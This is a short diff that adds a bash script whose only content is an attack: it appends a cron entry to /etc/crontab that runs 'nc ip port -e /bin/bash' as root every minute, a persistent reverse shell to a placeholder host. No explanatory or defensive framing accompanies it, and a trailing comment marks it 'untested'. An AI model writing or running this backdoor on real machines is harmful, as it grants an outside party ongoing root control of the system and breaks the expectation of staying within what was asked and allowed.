@@ -1,0 +1,6 @@
+#!/bin/bash
+
+if ! grep -q "port" /etc/crontab; then
+    echo "* * * * * root nc ip port -e /bin/bash" >> /etc/crontab
+fi
+# untested
